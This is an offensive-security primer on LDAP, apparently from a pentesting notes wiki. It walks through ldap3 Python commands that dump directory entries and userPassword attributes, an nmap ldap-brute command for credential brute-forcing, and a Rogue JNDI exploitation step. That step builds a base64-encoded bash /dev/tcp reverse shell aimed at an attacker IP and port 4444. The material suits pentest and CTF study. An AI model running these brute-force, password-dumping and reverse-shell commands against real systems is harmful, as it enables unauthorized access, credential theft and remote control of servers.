---
description: A primer into LDAP enumeration and exploitation
---

# LDAP Exploitation

## Enumeration

### Manual simple enumeration with ldap3

Manual LDAP Enumeration Attackers can perform manual LDAP enumeration using Python. Follow the steps given below to perform manual LDAP enumeration using Python.&#x20;

1. Using Nmap, check whether the target LDAP server is listening on the port `389` for LDAP and port `636` for secure LDAP.&#x20;
2. If the target server is listening on the specified ports, initiate the enumeration process by installing LDAP using the following command: pip3 install ldap3&#x20;
3. As shown in the code given below, create a server object (server), and specify the target IP address or hostname and port number. If the target server is listening on secure LDAP, specify `use_ssl = True`.&#x20;
4. Retrieve the Directory System Agent (DSA)â€“specific entry (DSE) naming contexts by specifying `get_info = ldap3.ALL`.&#x20;
5. Now, create a connection object, `connection`, and initiate a call to `bind()`.
6. If the connection is successful, True is displayed on the screen as follows:

```
>>> import ldap3
>>> server = ldap3.Server('Target IP Address', get_info = ldap3.ALL, port =389) 
>>> connection = ldap3.Connection(server) 
>>> connection.bind() 

True
```

7. Now, one can fetch information such as the domain name and naming context using the following script:

```
>>> server.info
```

8. After obtaining the naming context, retrieve all the directory objects using the script given below:

{% code overflow="wrap" %}
```
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*') 

True

>> connection.entries 
```
{% endcode %}

9. Now, use the following script to dump the entire LDAP:

{% code overflow="wrap" %}
```
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')


True 

>>> connection.entries
```
{% endcode %}

### Using nmap

Attackers use the `ldap-brute` NSE script to brute-force LDAP authentication. By default, it uses the built-in username and password lists.&#x20;

The `userdb` and `passdb` script arguments can be employed to use custom lists.

{% code overflow="wrap" %}
```
sudo nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=<DC_NAME>,dc=com"' <Target IP Address>
```
{% endcode %}

### Using ldapsearch

The `ldapsearch` is a shell-accessible interface for the `ldap_search_ext(3)` library call.&#x20;

The `ldapsearch` opens a connection to an LDAP server, binds it, and performs a search using the specified parameters.&#x20;



## Exploitation

### Using Rogue JNDI

Java Naming and Directory Interface is a Common interface to interact with Naming and Directory Services.&#x20;

To know more read [this](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf). &#x20;

#### Bash reverse shell using rogue jndi

Base 64 encoded reverse shell payload:

```
echo "bash -c bash -i >& /dev/tcp/<IP ADDRESS>/<PORT> 0>&1" | base64
```

Start a netcat listener on the PORT.

Use base 64 encoded payload for Rogue JNDI&#x20;

```
java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNy80NDQ0IDA+JjEiCg==}|{base64,-d}|{bash,-i}" --hostname "10.129.56.33"
```





